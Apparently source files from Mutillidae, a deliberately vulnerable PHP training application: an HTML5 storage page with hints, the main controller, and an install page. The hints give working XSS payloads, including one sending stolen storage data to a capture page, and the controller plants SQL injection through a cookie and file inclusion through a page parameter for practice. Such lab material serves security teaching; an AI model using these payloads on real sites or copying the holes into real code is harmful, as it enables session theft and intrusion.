		<span style="font-weight: bold;">Session Storage</span>
	</span>
	<span title="Click to delete locate storage" onclick='localStorage.clear(); var node=window.document.getElementById("idSessionStorageTableBody"); while(node.hasChildNodes()){node.removeChild(node.firstChild)}; init();' style="cursor: pointer;" >
		<img height="24px" width="24px" src="./images/delete-icon-256-256.png" style="vertical-align: middle;margin-left: 20px;" />
		<span style="font-weight: bold;">Local Storage</span>
	</span>
	<span title="Click to delete all html 5 storage" onclick='sessionStorage.clear();localStorage.clear(); var node=window.document.getElementById("idSessionStorageTableBody"); while(node.hasChildNodes()){node.removeChild(node.firstChild)}; init();' style="cursor: pointer;" >
		<img height="24px" width="24px" src="./images/delete-icon-256-256.png" style="vertical-align: middle;margin-left: 20px;" />
		<span style="font-weight: bold;">All Storage</span>
	</span>
</div>

<script type="text/javascript">
<!--
	try{
		document.getElementById("idDOMStorageKeyInput").focus();
		init();
	}catch(/*Exception*/ e){
		alert("Error trying to set focus: " + e.message);
	}// end try
//-->
</script>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<div>&nbsp;</div>
			<div>&nbsp;</div>
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<br/>
						<span class="report-header">DOM Injection</span>
						<br/><br/>
						Use Firebug or similar to examine the message that appears when a new
						item is added to storage. The message appears in a label below the two input fields.
						Inject XSS into the "key" field. This is output
						into the message. Craft a XSS to read the DOM storage or perform other 
						action.
						<br/><br/>
						<span class="report-header">HTML5 Storage API</span>
						<br/><br/>
						The Storage interface of the browser API
						<br/>
<code>							
interface Storage {
	readonly attribute unsigned long length;
	DOMString? key(unsigned long index);
	getter DOMString getItem(DOMString key);
	setter creator void setItem(DOMString key, DOMString value);
	deleter void removeItem(DOMString key);
	void clear();
}
</code>
						<br/>		
						An "interface" is a software class that is only a definition in itself
						and must be implemented to work. The Storage interface is implemented twice
						in the browser as part of the "Window" DOM object. One implementation 
						is the "Local Storage" object named "localStorage" and the other is 
						the "Session Storage" object named "sessionStorage".
						<br/><br/>
						To call the methods defined in the interface, call them using the "window"
						scope.
						<br/><br/>
						Example: 
						<br/>
<code>
// grab local session storage
var m = "";
var l = window.localStorage;
for(i=0;i&lt;length;i++){
	var lKey = l.key(i);
	m += lKey + "=" + l.getItem(lKey) + "; ";
}// end for i
alert(m);
</code>
								<br />
								<span class="report-header">Locating pages which use HTML5 storage</span>
								<br /><br />
								Pages using HTML5 storage are easy to locate since the source code is client-side. The 
								JavaScript API specifies the session storage objects are named sessionStorage and 
								localStorage which are both properties of the window object. Developers may put the 
								JavaScript in an included file, so check for JavaScript include file and search the 
								source code for "sessionStorage" and "localStorage".
								<br /><br />
								<span class="report-header">Reading HTML5 storage from the Browser</span>
								<br /><br />
								The values a site has placed into your browser can be read by you. They can also 
								be changed by you. Developers should know better than to place any type of 
								authentication token anywhere on the client, but this problem has existed 
								well before HTML5 storage and will continue with HTML storage.
								<br />
						  		If the web developer is trying to hide something in session storage or local storage
						  		that you want to read, you can type JavaScript into your browser address
						  		bar to read the HTML 5 storage. Cookies in general should not contain any
						  		information classified above "public". Developers are constantly making
						  		the mistake of thinking that because cookies happen to be difficult to view,
						  		they cannot be viewed. Functionally, HTML 5 storage is analogous to a big
						  		cookie.
								<br /><br />
								In some browsers, you can run JavaScript against the current page by 
								placing the prefix "javascript"
								followed by a colon and your JavaScript into the address bar.
								<br/><br/>
								Try It (Newer Firefox require you allow JavaScript in URL bar (about:config)):
								<br />
<code>
javascript:alert("It Works!");
</code>
							<br />
							NOTE: If new browsers disable JavaScript in the URL bar, install a real-time page 
							editor such as FireBug. In Firebug, open the "console" and use the command-line
							area at the bottom (Look for ">>>").
							<br/><br/>
							HTML5 storage provides an API for interaction with JavaScript. Therefore if
							you are using a page that uses HTML5 storage, you can read it with a 
							JavaScript. (The HTML5 storage is on your browser, so you may just be
							able to use the browser itself.)  
							<br/><br/>
							This script can read HTML5 storage from the page currently being browsed:
							<br />
<code>
&lt;script&gt;
	try{
		var m = &quot;&quot;;
		var l = window.localStorage;
		var s = window.sessionStorage;
		
		for(i=0;i&lt;l.length;i++){
			var lKey = l.key(i);
			m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;
		};

		for(i=0;i&lt;s.length;i++){
			var lKey = s.key(i);
			m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;
		};
		
		alert(m);
	}catch(e){
		alert(e.message);
	}
&lt;/script&gt;
</code>
							<br />
							Copy and Paste:
							<br /><br />
<code>
<span class="important-code">// JavaScript Alert Box version</span>
&lt;script&gt;try{var m = &quot;&quot;;var l = window.localStorage; var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};<span class="important-code">alert(m)</span>;}catch(e){alert(e.message);}&lt;/script&gt;
</code>
<br />
<code>
<span class="important-code">// window.document.write version</span>
&lt;script&gt;try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};<span class="important-code">window.document.write(m)</span>;}catch(e){alert(e.message);}&lt;/script&gt;
</code>
<br />
<code>
<span class="important-code">// Fireug console.log() or console.debug() version</span>
<span class="important-code">// NOTE: This version must be executed in the Firebug console</span>
try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;};<span class="important-code">console.log(m)</span>;}catch(e){alert(e.message);}
</code>

							<br />
							Except in SECURE mode, this page has some "secrets" hidden in the HTML5 storage. 
							To figure out what are the items, use a JavaScript injection in the Back button or
							the page footer (HTTP user-agent header) to inject your own JavaScript. 
							An easier way would be to remember that all the HTML5 storage and all JavaScript 
							is client-side which means it is running on your machine. You can simply read the 
							JavaScript that set the storage items.
							<br/><br/>
							<span class="report-header">Injecting values into session storage</span>
							<br /><br />
							If you are visiting a web site utilizing HTML5 storage, the storage is on your
							browser so injecting values is relatively easy but remember that HTML5 storage
							is stored by domain, protocol, and port so any code used to set storage values
							must be done in the context of the target page.
							<br /><br />
							This script will inject the following keys with the following values into the 
							current page context. This context will be valid as long as the domain, protocol,
							and port do not change.
							<br/>
<code>
&lt;script&gt;
	localStorage.setItem(&quot;AccountNumber&quot;,&quot;123456&quot;);
	sessionStorage.setItem(&quot;EnterpriseSelfDestructSequence&quot;,&quot;A1B2C3&quot;);
	sessionStorage.setItem(&quot;SessionID&quot;,&quot;japurhgnalbjdgfaljkfr&quot;);		
	sessionStorage.setItem(&quot;CurrentlyLoggedInUser&quot;,&quot;1233456789&quot;);
&lt;/script&gt;
</code>
							<br />
							Copy and Paste:
							<br />
<code>
&lt;script&gt; localStorage.setItem(&quot;AccountNumber&quot;,&quot;123456&quot;); sessionStorage.setItem(&quot;EnterpriseSelfDestructSequence&quot;,&quot;A1B2C3&quot;); sessionStorage.setItem(&quot;SessionID&quot;,&quot;japurhgnalbjdgfaljkfr&quot;); sessionStorage.setItem(&quot;CurrentlyLoggedInUser&quot;,&quot;1233456789&quot;); &lt;/script&gt;
</code>
							<br />
							After setting the values, read them back for confirmation. Use the scripts
							under section "Reading HTML5 storage". In fact, we can combine the two scripts
							and run them back to back.
<code>
&lt;script&gt; localStorage.setItem(&quot;AccountNumber&quot;,&quot;123456&quot;); sessionStorage.setItem(&quot;EnterpriseSelfDestructSequence&quot;,&quot;A1B2C3&quot;); sessionStorage.setItem(&quot;SessionID&quot;,&quot;japurhgnalbjdgfaljkfr&quot;); sessionStorage.setItem(&quot;CurrentlyLoggedInUser&quot;,&quot;1233456789&quot;); try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage; for(i=0;i&lt;l.length;i++){ var lKey = l.key(i); m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\n&quot;;}; for(i=0;i&lt;s.length;i++){ var lKey = s.key(i); m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\n&quot;;}; alert(m);}catch(e){ alert(e.message); } &lt;/script&gt;
</code>
							<br /><br />
							<span class="report-header">Over-writing existing HTML5 storage values</span>
							<br /><br/>
							Determine what the existing key-value pairs are in the HTML5 storage. 
							Use the scripts under section "Reading HTML5 storage". Choose the
							key-value pair to set. Finally use a script to over-write the 
							key-value pair. Note that the setItem() methods adds a new 
							key-value pair if the key does not already exist but over-writes
							the current value if the key is present.
							<br /><br />
							A smaller script can be used to read the currently stored keys:
							<br /> 
<code>
&lt;script&gt; var s = sessionStorage; var l = localStorage; var m = &quot;&quot;; for(i=0;i&lt;s.length;i++){m += &quot;sessionStorage:&quot; + s.key(i) + &quot;;\n&quot;;} for(i=0;i&lt;l.length;i++){m += &quot;localStorage:&quot; + l.key(i) + &quot;;\n&quot;;} alert(m); &lt;/script&gt;
</code>
							<br />
							One of the keys on this page is "MessageOfTheDay". To change that particular
							value, we can use another script:
							<br />
<code>
&lt;script&gt;localStorage.setItem(&quot;MessageOfTheDay&quot;,&quot;Hello World&quot;); &lt;/script&gt;
</code>
							<br />
							Depending on when this script is injected, the page may not display the changes.
							An inspection of the code reveals that the page calls a function "init()"
							in order to display the current values. Calling "init()" again after
							changing the value should show the change. Watch carefully. The page will
							display HTML5 storage from the initial call to init() then display
							all the values again. Notice the message of the day is different in the 
							second listing. Here is the modified script.
							<br />
<code>
&lt;script&gt;localStorage.setItem(&quot;MessageOfTheDay&quot;,&quot;Hello World&quot;); <span class="important-code">init();</span>&lt;/script&gt;
</code>
							<br/>
							One problem is the user might notice the page is not the same. Instead of one "MessageOfTheDay"
							there are now two; the original message plus the new message added by the cross-site script.
							To solve this issue, first overwrite the original message, then delete all the table rows being displayed.
							To delete the messages, use JavaScript to alter the DOM on the page.
							Finally call the pages own init() function to redraw the table.
							<br/>
							Hint: Click "View Source" and read the JavaScript in the init() function. It shows that the
							&quot;idSessionStorageTableBody&quot; is the HTML DOM element to which the table
							rows are added.
							<br/>
<code>
&lt;script&gt;localStorage.setItem(&quot;MessageOfTheDay&quot;,&quot;Hello World&quot;); <span class="important-code">var node=window.document.getElementById(&quot;idSessionStorageTableBody&quot;); while(node.hasChildNodes()){node.removeChild(node.firstChild)};</span> init();&lt;/script&gt;
</code>					
							<br /><br />
							<span class="report-header">Reading another users HTML5 storage</span>
							<br/><br/>
							If you want to read someone elses session storage or local storage,
							remember where the storage is located. The storage is on the client 
							machine	and is only accessible by scripts running in their browser.
							Therefore you need to get your JavaScript to run on that users machine.
							One way to do this is to either plant a persistent cross site script (XSS)
							and wait for the user to visit the infected site or phish using a
							reflected cross site script.
							<br/><br/>
							If injecting JavaScript into HTML, using a body-onload event or an image
							tag can be effective without overtly alerting the user. JavaScript can
							also be injected by wrapping the JavaScript code in script tags.
							<br/><br/>
							If injecting JavaScript into existing JavaScript code, 
							using an XHR (aka AJAX aka Web 2.0) script is a good way to inject scripts
							because the resulting script execution is less likely to be noticed by
							the user.
							<br/><br/>
							We can collect the HTML5 storage using the same script as in "Reading HTML5 
							Storage" but instead of displaying the data in a popup alert box we can
							send the data to a capture page.
							<br/>
<code>
&lt;script&gt;
	try{ 
		var s = sessionStorage;
		var l = localStorage;
		var m = &quot;&quot;;
		var lXMLHTTP;
					
		for(i=0;i&lt;s.length;i++){
			m += &quot;sessionStorage(&quot; + s.key(i) + &quot;):&quot; + s.getItem(s.key(i)) + &quot;; &quot;;
		}

		for(i=0;i&lt;l.length;i++){
			m += &quot;localStorage(&quot; + l.key(i) + &quot;):&quot; + l.getItem(l.key(i)) + &quot;; &quot;;
		}

		var lAction = &quot;http://localhost/mutillidae/capture-data.php?html5storage=&quot; + m; 
		lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; 
		lXMLHTTP.open(&quot;GET&quot;, lAction); 
		lXMLHTTP.send(&quot;&quot;); 
	}catch(e){} 
&lt;/script&gt;
</code>
							<br/>
							Copy and Paste:
							<br />
<code>
&lt;script&gt; try{ var s = sessionStorage; var l = localStorage; var m = &quot;&quot;; var lXMLHTTP; for(i=0;i&lt;s.length;i++){ m += &quot;sessionStorage(&quot; + s.key(i) + &quot;):&quot; + s.getItem(s.key(i)) + &quot;; &quot;; } for(i=0;i&lt;l.length;i++){ m += &quot;localStorage(&quot; + l.key(i) + &quot;):&quot; + l.getItem(l.key(i)) + &quot;; &quot;; } var lAction = &quot;http://localhost/mutillidae/capture-data.php?html5storage=&quot; + m; lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open(&quot;GET&quot;, lAction); lXMLHTTP.send(&quot;&quot;); }catch(e){} &lt;/script&gt;
</code>
							<br/>							
								Try injecting JavaScript into the user-agent HTTP header because it is displayed
								in the footer.
							<br /><br />
							<span class="report-header">Where is this page vulnerable to cross site scripting</span>
							<br/><br/>
							The add new key field is vulnerable to HTML injection and event based JavaScript
							injection because the keys that are added by the user are reflected back when
							the page inserts the key into the span using the innerHTML property.
							<br/><br/>
							For example, the following key can injected along with any value.
							<br/>
<code>
&lt;/span&gt;&lt;span onmouseover=&quot;alert(1);&quot;&gt;ERROR&lt;/span&gt;&lt;span&gt;
</code>
							<br/>
							The "BACK" button is vulnerable to JavaScript injection and the page footer
							displays the value of the user-agent string making it vulnerable as well.
							<br/><br/>
							The most practical vulnerabilities is the users message. Note the site does
							not output encode the username or the users message. These values are
							database values meaning they present a persistent cross site script.
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])

	if ($_SESSION["showhints"] == 2) {
		include_once './includes/cross-site-scripting-tutorial.inc';
	}// end if
?><?php
	/* ------------------------------------------
	 * Constants used in application
	 * ------------------------------------------ */
	include_once './includes/constants.php';
    
    /* ------------------------------------------
     * INITIALIZE SESSION
     * ------------------------------------------ */
	//initialize session
    if (strlen(session_id()) == 0){
    	session_start();
    }// end if

    // ----------------------------------------
	// initialize showhints session and cookie 
	// ----------------------------------------
	/* This code is here to create a simulated vulnerability. Some
	 * sites put authorication and status tokens in cookies instead
	 * of the session. This is a mistake. The user controls the 
	 * cookies entirely.
	 */
	if (isset($_COOKIE["showhints"])){
		$l_showhints_cookie = $_COOKIE["showhints"];
	}else{
		$l_showhints_cookie = 0;
	}// end if

	// make session = cookie
	$_SESSION["showhints"] = $l_showhints_cookie;
	switch ($l_showhints_cookie){
		case 0: $_SESSION["hints-enabled"] = "Disabled (".$l_showhints_cookie." - I try harder)"; break;
		case 1: $_SESSION["hints-enabled"] = "Enabled (".$l_showhints_cookie." - 5cr1pt K1dd1e)"; break;
		case 2: $_SESSION["hints-enabled"] = "Enabled (".$l_showhints_cookie." - Noob)"; break;
	}// end switch
	    
    // initialize security level to "insecure"
    if (!isset($_SESSION['security-level'])){
    	$_SESSION['security-level'] = '0';
    }// end if
    
	// user is logged out by default
    if (!isset($_SESSION["loggedin"])){
	    $_SESSION['loggedin'] = 'False';
	    $_SESSION['logged_in_user'] = '';
	    $_SESSION['logged_in_usersignature'] = '';	    	
    }// end if    
    
    if (!isset($_SESSION["hints-enabled"])){
    	$_SESSION["hints-enabled"] = "Disabled";
    }// end if

	/* ------------------------------------------
	 * initialize OWASP ESAPI for PHP
	 * ------------------------------------------ */
    require_once 'owasp-esapi-php/src/ESAPI.php';
	if (!isset($ESAPI)){
		$ESAPI = new ESAPI('owasp-esapi-php/src/ESAPI.xml');
		$Encoder = $ESAPI->getEncoder();
		$ESAPIRandomizer = $ESAPI->getRandomizer();
	}// end if

	/* ------------------------------------------
	 * initialize custom error handler
	 * ------------------------------------------ */
    require_once 'classes/CustomErrorHandler.php';
	if (!isset($CustomErrorHandler)){
		$CustomErrorHandler = 
		new CustomErrorHandler("owasp-esapi-php/src/", $_SESSION["security-level"]);
	}// end if	

	/* ------------------------------------------
 	* initialize log error handler
 	* ------------------------------------------ */
    require_once 'classes/LogHandler.php';
	if (!isset($LogHandler)){
		$LogHandler = 
		new LogHandler("owasp-esapi-php/src/", $_SESSION["security-level"]);
	}// end if
	
    /* ------------------------------------------
     * INITIALIZE DATABASE
     * ------------------------------------------ */
    require_once 'config.inc';
    require_once 'opendb.inc';
	
	/* ------------------------------------------
     * PROCESS REQUESTS
     * ------------------------------------------ */
	if (isset($_GET["do"])){
    	include ("process-commands.php");
    }// end if
    
    // detect and process login attempt
    if (isset($_POST["login-php-submit-button"])){
    	include ("process-login-attempt.php");
    }// end if
	/* ------------------------------------------
     * END PROCESS REQUESTS
     * ------------------------------------------ */	
    
	/* ------------------------------------------
     * REACT TO CLIENT SIDE CHANGES
     * ------------------------------------------ */

	switch ($_SESSION["security-level"]){
   		case "0": // This code is insecure
   		case "1": // This code is insecure
			/* Use the clients authorization token which is stored in
			 * the cookie (in this case). Placing authorization tokens
			 * on the client is fairly ridiculous.
			 * 
			 * Known Vulnerabilities: SQL Injection, Authorization Bypass, Session Fixation,
			 * 	Lack of custom error page, Application Exception
			 */
   			if (isset($_COOKIE['uid'])){
			    try {	    	
					$query  = "SELECT * FROM accounts WHERE cid='" . $_COOKIE['uid'] . "'";
					$result = $conn->query($query);
					if (!$result) {
				    	throw (new Exception('Error executing query: '.$conn->error, $conn->errorno));
				    }// end if

				    // Switch to whatever cookie the user sent to simulate sites
				    // that use client-side authorization tokens. Auth information
				    // should never be in cookies.
				    if ($result->num_rows > 0) {
					    $row = $result->fetch_object();
						$_SESSION['loggedin'] = 'True';
						$_SESSION['uid'] = $row->cid;
						$_SESSION['logged_in_user'] = $row->username;
						$_SESSION['logged_in_usersignature'] = $row->mysignature;
						$_SESSION['is_admin'] = $row->is_admin;
   						header('Logged-In-User: '.$_SESSION['logged_in_user'], true);
			    	}// end if ($result->num_rows > 0)
				    
				} catch (Exception $e) {
			   		echo $CustomErrorHandler->FormatError($e, $query); 
			   	}// end try
   			}else{
	   			/* 
	   			 * Output the user's login name into a custom header 
	   			 * 
	   			 * Known Vulnerability: Potential HTTP Response Splitting
	   			 * (PHP defends itself against HTTP response splitting by
	   			 * filtering "new line" characters)
	   			 */
   				header('Logged-In-User: '.$_SESSION['logged_in_user'], true);
   			}// end if

   		break;
	    
   		case "2":
   		case "3":
   		case "4":
   		case "5": // This code is fairly secure
  			/* If we are secure, then we do not rely on any client input
  			 * to make authorization decisions. Authorization tokens should
  			 * never be stored on the client. We use the SESSION in secure mode.
  			 * 
  			 * Also, when we create an HTTP header, we encode any output to 
  			 * prevent response splitting. The critical chars in response splitting
  			 * are CR-LF. Dont fall for filtering. Just encode it all.  			
  			 */
   			header('Logged-In-User: '.$Encoder->encodeForHTML($_SESSION['logged_in_user']), TRUE);
   		break;
   	}// end switch
	/* ------------------------------------------
     * END REACT TO CLIENT SIDE CHANGES
     * ------------------------------------------ */

   	/* ------------------------------------------
    * ANTI-CLICK-JACKING (Modern Browsers)
    * ------------------------------------------ */
	switch ($_SESSION["security-level"]){
   		case "0": // This code is insecure
   			$lIncludeFrameBustingJavaScript = FALSE;
   		break;
   		case "1":
			$lIncludeFrameBustingJavaScript = TRUE;
   		break;

   		case "2":
   		case "3":
   		case "4":
   		case "5": // This code is fairly secure
  			/* To prevent click-jacking and IE6 key-log-via-framing issue
  			 * we can instruct the browser that it should not frame our site. 
  			 * Unfortuneately only the latest browsers support this option.
  			 * There are javascript frame-buster options that work reasonably well
  			 * although the arms race continues. Use the x-frame-options as the
  			 * primary defense and include the javascript frame-buster to help
  			 * with older browsers.
  			 */
   			header('X-FRAME-OPTIONS: DENY', TRUE);
   			$lIncludeFrameBustingJavaScript = TRUE;
   		break;
   	}// end switch
	/* ------------------------------------------
    * END ANTI-CLICK-JACKING (Modern Browsers)
    * ------------------------------------------ */
	 
	 /* ------------------------------------------
     * CACHE CONTROL
     * ------------------------------------------ */
	try{
		/*
		 * This section detects if the header_remove() function should
		 * be supported. PHP 5.3 first includes this function.
		 */
		$l_header_remove_supported = FALSE;
		$l_phpversion = explode(".", phpversion());
		$l_phpmajorversion = (int)$l_phpversion[0];
		$l_phpminorversion = (int)$l_phpversion[1];
		if (($l_phpmajorversion >= 5 && $l_phpminorversion >= 3) || $l_phpmajorversion > 5){
			$l_header_remove_supported = TRUE;
		}else{
			$l_header_remove_supported = FALSE;
		}// end if
	} catch (Exception $e) {
   		//Bummer: Not sure if we have support
		$l_header_remove_supported = FALSE;
   	}// end try

	switch ($_SESSION["security-level"]){
   		case "0": // This code is insecure
   		case "1": // This code is insecure
			try{
				/*
				 * This section is the cache-control. This only works in PHP 5.3
				 * and higher due to the header_remove function becoming
				 * available at that time.
				 */
				if ($l_header_remove_supported){
					/* Try to get rid of expires, last-modified, Pragma,
					 * cache control header, HTTP/1.1 and cookie cache control
					 * that would be created if the user
					 * enabled security level 5. 
					 */
					header_remove("Expires");
					header_remove("Last-Modified");
					header_remove("Cache-Control");
					header_remove("Pragma");			
				}else{
					/* Try to get rid of expires, last-modified, Pragma,
					 * cache control header, HTTP/1.1 and cookie cache control
					 * that would be created if the user
					 * enabled security level 5. 
					 */
					 /*This line causes severe issues with the toggle security and toggle hints. 
						DO NOT uncomment until a patch is found.
						header("Expires: Mon, 26 Jul 2050 05:00:00 GMT", TRUE);
					*/
					header("Last-Modified: Mon, 26 Jul 2050 05:00:00 GMT", TRUE);
					header('Cache-Control: public', TRUE);
					header("Pragma: public", TRUE);
				}// end if
			} catch (Exception $e) {
		   		//Bummer: The cahce-control exercise are not working
		   	}// end try
   		break;
	    		
   		case "2":
   		case "3":
   		case "4":
   		case "5": // This code is fairly secure
   			/*
   			 * Forms caching:
   			 * In insecure mode, we do nothing (as is often the case with insecure mode)
   			 * In secure mode, we set the proper caching directives to help prevent client side caching
   			 * 
   			 * When the browser caches the information asset just walked out the door. HTML 5 combined
   			 * with naive developers is going to make this problem much worse. HTML 5 includes advanced
   			 * cookies called "offline" storage or "DOM" storage. This is going to be a nightmare
   			 * for enterprises to protect their data from leakage.
   			 */
			// Expires: past date tells browser that file is out of date
			header("Expires: Mon, 26 Jul 1997 05:00:00 GMT", TRUE);
						
			// Always modified - Tells browser that new content available
			header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT", TRUE);
			
			// HTTP/1.1 and cookie cache control
			header('Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0, no-cache="set-cookie"', TRUE);
						
			// HTTP/1.0 cache-control
			header("Pragma: no-cache", TRUE);

			try{
				/*
				 * Remove x-powered-by header and server header for security. 
				 * Server is hard to get rid of without modifying the Apache config because Apache
				 * adds the header after the PHP has already been rendered and sent to Apache,
				 * but atleast we discussed it here.
				 */
				if ($l_header_remove_supported){
					header_remove("X-Powered-By");
					header_remove("Server");			
				}else{
					/* Try to get rid of expires, last-modified, Pragma,
					 * cache control header, HTTP/1.1 and cookie cache control
					 * that would be created if the user
					 * enabled security level 5. Server is often over-ridden 
					 * by Apache no matter what we do. Change Apache config to fix.
					 */
					header("X-Powered-By: Ming Industries Draconian Power Ring", TRUE);
					header("Server: Kentucky Wildcat Baskeball", TRUE);
				}// end if
			} catch (Exception $e) {
		   		//Bummer: The server blabbermouth defense is not working
		   	}// end try
   		break;
   	}// end switch		
	/* ------------------------------------------
     * END CACHE CONTROL
     * ------------------------------------------ */

	/* ------------------------------------------
     * HTML\JAVASCRIPT COMMENTS
     * ------------------------------------------ */
   	/* In general, HTML and JavaScript comments are to 
   	 * be avoided. Commenting is an excellent practice,
   	 * but the comments should be kept on the server 
   	 * where they belong. To accomplish this, simply
   	 * use the frameworks comment tags rather than
   	 * the HTML and JavaScript style comments.
   	 */
	switch ($_SESSION["security-level"]){
   		case "0": // This code is insecure
   		case "1":
			echo '
			<!-- I think the database password is set to blank or perhaps samurai.
			It depends on whether you installed this web app from irongeeks site or
			are using it inside Kevin Johnsons Samurai web testing framework. 
			It is ok to put the password in HTML comments because no user will ever see 
			this comment. I remember that security instructor saying we should use the 
			framework comment symbols (ASP.NET, JAVA, PHP, Etc.) 
			rather than HTML comments, but we all know those 
			security instructors are just making all this up. -->'; 
   		break;
	    
   		case "2":
   		case "3":
   		case "4":
   		case "5": // This code is fairly secure
   			/*
   			 * Note: Notice these are PHP comments rather than client side comments.
   			 * I think the database password is set to blank or perhaps samurai.
   			 */
   		break;
   	}// end switch
	/* ------------------------------------------
     * END HTML\JAVASCRIPT COMMENTS
     * ------------------------------------------ */
	
	/* ------------------------------------------
     * DISPLAY PAGE
     * ------------------------------------------ */

   	/* ------------------------------------------
    * "PAGE" VARIABLE INJECTION
    * ------------------------------------------ */
   	$lPage = "home.php";
	switch ($_SESSION["security-level"]){
   		case "0": // This code is insecure
   		case "1": // This code is insecure
		    // Get the value of the "page" URL query parameter
		    if (isset($_REQUEST["page"])) {
		    	$lPage = $_REQUEST["page"];
		    }// end if
   		break;
	    		
   		case "2":
   		case "3":
   		case "4":
   		case "5": // This code is fairly secure
  			/* To prevent page injection, we start with the basic priciple
  			 * of "DENY ALL". We decide to allow only the characters abosolutely
  			 * neccesary to spell the Mutillidae file names. This requires 
  			 * alpha, hyphen, and period.
  			 */
		    // Get the value of the "page" URL query parameter without accepting POST.
		    if (isset($_GET["page"])) {
		    	$lPage = $_GET["page"];
		    }// end if
   			
   			$lPageIsAllowed = (preg_match("/^[a-zA-Z0-9\.\-]+$/", $lPage) == 1);    			
   			if (!$lPageIsAllowed){
		    	$lPage = "page-not-found.php";
   			}// end if
   		break;
   	}// end switch
	/* ------------------------------------------
    * END "PAGE" VARIABLE INJECTION
    * ------------------------------------------ */

	/* ------------------------------------------
     * SIMULATE "SECRET" PAGES
     * ------------------------------------------ */
	switch ($lPage){
   		case "secret.php":
   		case "admin.php":
   		case "_adm.php":
   		case "_admin.php":
   		case "root.php":
   		case "administrator.php":
   		case "auth.php":
   		case "hidden.php":
   		case "console.php":
   		case "conf.php":
   		case "_private.php":
   		case "private.php":
   		case "access.php":
   		case "control.php":
   		case "control-panel.php":

   			switch ($_SESSION["security-level"]){
		   		case "0": // This code is insecure
		   		case "1": // This code is insecure
	    			$lPage="phpinfo.php";
		   		break;
		
		   		case "2":
		   		case "3":
		   		case "4":
		   		case "5": // This code is fairly secure
		  			/* To prevent unauthorized access, we start with the basic priciple
		  			 * of "DENY ALL". 
		  			 */
		   			$lUserAuthorized = FALSE; 
		   			if(isset($_SESSION['is_admin'])){
		   				if($_SESSION['is_admin'] == 'TRUE'){
		   					$lUserAuthorized = TRUE;
		   				}// end if is_admin
		   			}// end if isseet $_SESSION['is_admin']
		   			
		   			if($lUserAuthorized){
		   				$lPage="phpinfo.php";
		   			}else{
		   				$lPage="authorization-required.php";
		   			}// end if $lUserAuthorized
		   			
		   		break;//case 5
		   	}// end switch
		    			
   		break;
   		default:break;
    }//end switch on page   	
	/* ------------------------------------------
     * END SIMULATE "SECRET" PAGES
     * ------------------------------------------ */
   	
	/* ------------------------------------------
    * BEGIN OUTPUT RESPONSE
    * ------------------------------------------ */
    if (strlen($lPage)==0 || !isset($lPage)){
	    include ("header.php");
    	include("home.php");
	    include ("footer.php");
    } elseif ($lPage=="rene-magritte.php") {
    	/* This page is our framing demonstration. 
    	 * The page goes in an iframe so we dont want to
    	 * show the header and footer again. They will
    	 * already show in the outer frame.
    	 */    	
	    include ($lPage);
    } else {
    	include ("header.php"); 
	    include ($lPage);
	    include ("footer.php");
    }// end if

    /* ------------------------------------------
     * Anti-framing protection (Older Browsers)
     * ------------------------------------------ */
    if ($lIncludeFrameBustingJavaScript){
    	require_once ("./includes/anti-framing-protection.inc");	
    }// end if    
    
    /* ------------------------------------------
     * LOG USER VISIT TO PAGE
     * ------------------------------------------ */
	require_once ("log-visit.php");
    
    /* ------------------------------------------
     * CLOSE DATABASE CONNECTION
     * ------------------------------------------ */
    require_once ("closedb.inc");
    
   	require_once ("./includes/create-html-5-web-storage-target.inc");	
    
?>
<div class="page-title">Installation Options</div>

<?php include_once './includes/back-button.inc';?>

<span style="font-weight: bold;text-align: center;">Some Options to run Mutillidae</span>
<div>&nbsp;</div>
<div style="margin:20px">
	<span style="font-weight: bold;">a.	Samurai Web Testing Framework</span>
	<div style="margin:20px">
		i.	Samurai WTF 0.95 is a Linux "Live" DVD to which the users machine boots. 
		Within Samurai is several vulnerable web applications pre-configured to test for 
		vulnerabilities. One of the available applications is Mutillidae version 1. 
		Samurai is preparing to release version 1.0 which will include Mutillidae 2.x.
	</div>

	<span style="font-weight: bold;">b.	XAMPP (Windows , Linux , Mac OS X )</span>
	<div style="margin:20px">
		i.	XAMPP is a single installation package which bundles Apache web server, 
			PHP application server, and MySQL database. XAMPP installs Apache and 
			MySQL as either executable or services and can optionally start these 
			services automatically. Once installed XAMPP provides an "htdocs" 
			directory. This directory is "root" meaning that if you browse to 
			http://localhost/, the web site in that "htdocs" folder is what will 
			be served. Mutillidae is installed by placing the multillidae folder 
			into the htdocs folder. The result is that mutillidae is a sub-site 
			served from the mutillidae folder. This makes the URL for mutillidae
			http://localhost/mutillidae.
	</div>
	<div style="margin:20px">
			The mutillidae files are already in a folder called "mutillidae" when 
			the project is zipped. All that is required is to put the mutillidae 
			folder into the htdocs directory.
	</div>
	<div style="margin:20px">
			The	Mutillidae package can be unzipped into htdocs to install Mutillidae. 
			Simply unzip the compressed mutillidae folder right into the htdocs
